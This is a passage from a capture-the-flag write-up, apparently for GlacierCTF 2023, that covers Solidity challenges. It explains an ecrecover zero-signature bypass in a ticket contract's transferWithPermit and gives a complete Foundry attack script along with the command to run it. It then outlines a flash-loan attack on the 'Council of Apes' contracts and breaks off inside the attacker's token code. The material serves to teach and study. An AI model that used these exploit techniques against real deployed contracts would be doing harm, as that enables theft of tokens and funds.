&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transferWithPermit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 tokenId&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 deadline&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint8 v&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes32 r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes32 s&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;timestamp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;= &lt;&#x2F;span&gt;&lt;span&gt;deadline&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: permit expired&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    bytes32 digest &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encodePacked&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\x19\x01&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_getDomainSeparator&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(abi&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(PERMIT_TYPEHASH&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;tokenId&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;nonces[from]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;++&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;deadline))))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    address signer &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ecrecover&lt;&#x2F;span&gt;&lt;span&gt;(digest&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;v&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;s)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(signer &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ticket: invalid permit&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_transfer&lt;&#x2F;span&gt;&lt;span&gt;(from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;tokenId)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;We can transfer ticket to an address if we have the signature of a ticket owner. We cant get the signature of someone. Lets see who are the owners of some tickets.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mapping &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;address) private _owners&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Here we know that the default owner of a ticket is &lt;code&gt;0&lt;&#x2F;code&gt; address. In the &lt;code&gt;burn()&lt;&#x2F;code&gt; function also updates the owner of the ticket to &lt;code&gt;address(0)&lt;&#x2F;code&gt;. So, If we managed to get the signature of the &lt;code&gt;address(0)&lt;&#x2F;code&gt; and set the from address to &lt;code&gt;0&lt;&#x2F;code&gt; as the from address check is not done inside the transferWithPermit() function.&lt;&#x2F;p&gt;
&lt;p&gt;By simply researching about ecrecover we can get to know that values of &lt;code&gt;v - 0, r - 0, s - 0&lt;&#x2F;code&gt; will recover the address of &lt;code&gt;0&lt;&#x2F;code&gt;. Now passing the from address as 0, signature values as 0 will bypass the signature check and transfers a ticket to our specified address. Then simply calling takeRide function will increment the tripsTaken variable.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;ChairLiftAttack.s.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;18&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Ticket} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;ChairLift&#x2F;Ticket.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{ChairLift} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;ChairLift&#x2F;ChairLift.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Setup} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;src&#x2F;ChairLift&#x2F;Setup.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{Script} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;Script.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;{console} &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;forge-std&#x2F;console.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract AttackScript is Script{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;run&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;startBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;new &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;Attack&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;console&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;log&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Attack Success&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        vm&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;stopBroadcast&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Attack{
&lt;&#x2F;span&gt;&lt;span&gt;    Setup public setupContract &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Setup&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0xB09c4177c15f9C5d4F6a8f1Bfa06cF4b77907Ff7&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    ChairLift public chairlift &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ChairLift&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(setupContract&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;TARGET&lt;&#x2F;span&gt;&lt;span&gt;()))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    Ticket public ticket &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Ticket&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(chairlift&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ticket&lt;&#x2F;span&gt;&lt;span&gt;()))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exploit&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public&lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        ticket&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transferWithPermit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;block&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;timestamp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        chairlift&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;takeRide&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F;gctf{Y0u_d1d_1t!_Y0u_r34ch3d_th3_p34k!}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To solve the challenge run the following command&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;forge&lt;&#x2F;span&gt;&lt;span&gt; script script&#x2F;ChairLiftAttack.s.sol:AttackScript&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;RPC-URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;-private-key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;REDACTED&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;-broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;the-concil-of-apes-456pts&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#the-concil-of-apes-456pts&quot; aria-label=&quot;Anchor link for: the-concil-of-apes-456pts&quot;&gt;The Concil of Apes [456pts]&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;Description : 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;On top of the glacier you run into a bunch of monkeys. They are screaching at each other, throwin feces around and won&amp;#39;t let you pass. You will need to somehow get rid of them to finish your mission.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;author: J4X
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nc chall.glacierctf.com 13380
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Attached files&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;GlacierCTF23Solves&#x2F;blob&#x2F;main&#x2F;src&#x2F;CouncilOfApes&#x2F;Setup.sol&quot; target=_blank&gt;Setup.sol&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;GlacierCTF23Solves&#x2F;blob&#x2F;main&#x2F;src&#x2F;CouncilOfApes&#x2F;CouncilOfApes.sol&quot; target=_blank&gt;CouncilOfApes.sol&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;GlacierCTF23Solves&#x2F;blob&#x2F;main&#x2F;src&#x2F;CouncilOfApes&#x2F;IcyExchange.sol&quot; target=_blank&gt;IcyExchange.sol&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;GlacierCTF23Solves&#x2F;blob&#x2F;main&#x2F;src&#x2F;CouncilOfApes&#x2F;IcyPool.sol&quot; target=_blank&gt;IcyPool.sol&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;GlacierCTF23Solves&#x2F;blob&#x2F;main&#x2F;src&#x2F;CouncilOfApes&#x2F;TotallyNotCopiedToken.sol&quot; target=_blank&gt;TotallyNotCopiedToken.sol&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;GlacierCTF23Solves&#x2F;blob&#x2F;main&#x2F;src&#x2F;CouncilOfApes&#x2F;IERC20.sol&quot; target=_blank&gt;IERC20.sol&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;GlacierCTF23Solves&#x2F;blob&#x2F;main&#x2F;src&#x2F;CouncilOfApes&#x2F;ERC20.sol&quot; target=_blank&gt;ERC20.sol&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;This was an interesting and a bit of hard chall I would say, It took me more than an half day to understand the code base and solve the challenge.&lt;&#x2F;p&gt;
&lt;p&gt;To solve the challenge we need to understand the entire code base, how the tokens are deployed, what is our goal, etc.&lt;&#x2F;p&gt;
&lt;p&gt;At an high level our goal is to call the &lt;code&gt;dissolveCouncilOfTheApes()&lt;&#x2F;code&gt; function of &lt;code&gt;CouncilOfApes&lt;&#x2F;code&gt; contract. To call this function we need to upgrade our user class from &lt;code&gt;APE&lt;&#x2F;code&gt; to &lt;code&gt;GORILLA&lt;&#x2F;code&gt;. For this we should have more than &lt;code&gt;1_000_000_000&lt;&#x2F;code&gt; votes. An &lt;code&gt;APE&lt;&#x2F;code&gt; can vote it self with the &lt;code&gt;balanaBalance&lt;&#x2F;code&gt;. To get &lt;code&gt;1_000_000_000&lt;&#x2F;code&gt; votes we should have &lt;code&gt;1_000_000_000&lt;&#x2F;code&gt; bananabalance, but we only have 1.&lt;&#x2F;p&gt;
&lt;p&gt;To get more bananaBalance we should exchange our &lt;code&gt;IcyTokens&lt;&#x2F;code&gt;, But we dont have them. We can get the &lt;code&gt;FlashLoan&lt;&#x2F;code&gt; of &lt;code&gt;IcyTokens&lt;&#x2F;code&gt;. To get pass the checks in FlashLoan function we should deploy our own Token with totalSupply less than &lt;code&gt;100_000_000&lt;&#x2F;code&gt;. And we need to create pool on &lt;code&gt;IcyExchange&lt;&#x2F;code&gt; contract.&lt;&#x2F;p&gt;
&lt;p&gt;After creating a fake custom token and creating a pool we can able to get a FlashLoan of required amount. Then I took flashloan and used those IcyTokens to buy bananaBalance and voted my self to update the class to GORILLA from APE. Then there is way to mint more bananaBalance using &lt;code&gt;issueBanana()&lt;&#x2F;code&gt; function then I used &lt;code&gt;sell()&lt;&#x2F;code&gt; to exchange bananaBalance with &lt;code&gt;IcyTokens&lt;&#x2F;code&gt; and I repayed those tokens back to IcyExchange cause I took flashloan from it.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;MyNewToken.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;..&#x2F;..&#x2F;src&#x2F;CouncilOfApes&#x2F;ERC20.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract MyNewToken is ERC20 
&lt;&#x2F;span&gt;&lt;span&gt;{
